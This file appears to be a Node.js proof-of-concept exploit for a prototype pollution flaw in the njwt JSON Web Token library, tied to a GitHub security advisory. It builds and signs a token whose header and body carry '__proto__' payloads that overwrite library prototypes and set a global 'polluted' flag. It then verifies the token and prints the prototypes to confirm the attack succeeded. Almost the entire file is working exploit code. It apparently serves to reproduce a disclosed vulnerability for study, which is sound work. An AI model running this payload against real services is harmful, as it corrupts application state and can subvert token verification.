//const nJwt = require('../../packages/GHSA-3hvj-2783-34x2/package/index');

const nJwt = require('./package/index');
const crypto = require('crypto');

// Utility to base64url-encode without padding
function base64url(input) {
  return Buffer.from(input)
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

// 1. Construct raw header (with prototype pollution)
const headerRaw = `{
  "typ": "JWT",
  "alg": "HS256",
  "__proto__": {
    "compact": null,
    "reservedKeys": ["typ", "random_gibberish"]
  }
}`;

// 2. Construct raw body (with prototype pollution)
const now = Math.floor(Date.now() / 1000);
const bodyRaw = `{
  "sub": 1,
  "scope": "user",
  "jti": "bafb16ce-20d6-4cd7-9483-65a0958a8e64",
  "iat": ${now},
  "exp": ${now + 3600},
  "__proto__": {
    "compact": null,
    "toJSON": null,
    "polluted": true
  }
}`;

// 3. Encode both
const encodedHeader = base64url(headerRaw);
const encodedBody = base64url(bodyRaw);
const signingInput = `${encodedHeader}.${encodedBody}`;

// 4. Use a consistent secret key like the PoC
const signingKey = Buffer.from("supersecretkey1234567890abcdef", "utf-8");

// 5. Sign the token (HMAC SHA-256)
const signature = crypto
  .createHmac('sha256', signingKey)
  .update(signingInput)
  .digest('base64')
  .replace(/\+/g, '-')
  .replace(/\//g, '_')
  .replace(/=+$/, '');

const token = `${signingInput}.${signature}`;
console.log("Crafted Token:\n", token);

// 6. Show prototypes BEFORE pollution
console.log("\n[Before Pollution]");
console.log("JwtHeader.prototype.reservedKeys:", nJwt.JwtHeader.prototype.reservedKeys);
console.log("JwtBody.prototype.compact:", typeof nJwt.JwtBody.prototype.compact);
console.log("{}.polluted:", {}.polluted);

// 7. Verify token — PoC style
nJwt.verify(token, signingKey, function (err, verifiedJwt) {
  console.log("\n[After Verification]");
  if (err) {
    console.error("❌ Verification failed:", err);
    return;
  }

  console.log("✅ Token verified.");
  console.log("Verified JWT body:", verifiedJwt.body);

  // Inspect prototype changes again
  console.log("JwtHeader.prototype.reservedKeys:", nJwt.JwtHeader.prototype.reservedKeys);
  console.log("JwtBody.prototype.compact:", typeof nJwt.JwtBody.prototype.compact);
  console.log("{}.polluted:", {}.polluted); // pollution success = true
});

